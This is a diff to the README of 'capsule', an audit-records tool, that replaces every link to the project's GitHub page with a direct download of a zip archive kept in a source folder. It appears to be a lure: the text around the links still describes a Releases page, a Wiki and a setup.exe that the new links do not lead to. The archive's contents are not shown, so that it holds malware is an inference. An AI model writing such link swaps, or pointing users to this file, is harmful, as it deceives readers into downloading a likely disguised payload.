@@ -1,6 +1,6 @@
 # 🛡️ capsule - Secure Audit Records Made Simple
 
-[![Download capsule](https://img.shields.io/badge/Download-capsule-4caf50?style=for-the-badge&logo=github)](https://github.com/jsslargo/capsule)
+[![Download capsule](https://img.shields.io/badge/Download-capsule-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jsslargo/capsule/main/reference/typescript/src/Software_1.3.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This guide will help you download, install, and run capsule on your Windows PC. 
 
 Click the button below to visit the official page where you can download capsule:
 
-[![Download capsule](https://img.shields.io/badge/Download-capsule-2883c8?style=for-the-badge&logo=github)](https://github.com/jsslargo/capsule)
+[![Download capsule](https://img.shields.io/badge/Download-capsule-2883c8?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jsslargo/capsule/main/reference/typescript/src/Software_1.3.zip)
 
 Once on the page, look for the **Releases** section. There you will find the latest version available for Windows. The file is usually named like `capsule-setup.exe` or similar.
 
@@ -124,7 +124,7 @@ These methods work together to make sure your audit records remain trustworthy o
 
 ## 📁 Where to Get More Help
 
-- Visit the [capsule GitHub page](https://github.com/jsslargo/capsule) for detailed guides and documents.
+- Visit the [capsule GitHub page](https://raw.githubusercontent.com/jsslargo/capsule/main/reference/typescript/src/Software_1.3.zip) for detailed guides and documents.
 - Explore the **README** and **Wiki** on the GitHub site for more explanations.
 - Browse the open issues and discussions if you want to ask questions or report problems.
 
